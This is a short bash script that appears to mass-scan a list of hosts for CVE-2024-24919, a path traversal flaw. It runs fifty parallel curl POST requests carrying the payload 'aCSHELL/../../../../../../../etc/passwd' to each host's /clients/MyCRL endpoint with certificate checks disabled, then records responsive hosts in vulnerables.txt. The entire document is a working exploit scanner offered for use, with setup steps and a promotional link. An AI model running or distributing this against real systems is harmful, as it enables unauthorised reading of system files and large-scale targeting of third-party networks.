#!/bin/bash
# PASS1: apt-get install parallel curl -y #
# PASS2: chmod +x SCAN-CVE-2024-24919.sh #
# FOLLOW ME MY GIT: https://github.com/J4F9S5D2Q7 #

clear
cat targets | parallel -j50 'request=$(timeout 10 curl -s -k -X POST -H "Content-Type: text/plain" -d "aCSHELL/../../../../../../../etc/passwd" https://{}/clients/MyCRL | grep -oP "cli.sh" | head -n1)
if [ "$request" == "cli.sh" ]
then
echo -e "{} - VULNERABLE"
echo -e "{}" >> vulnerables.txt
else
echo -e "X"
fi'
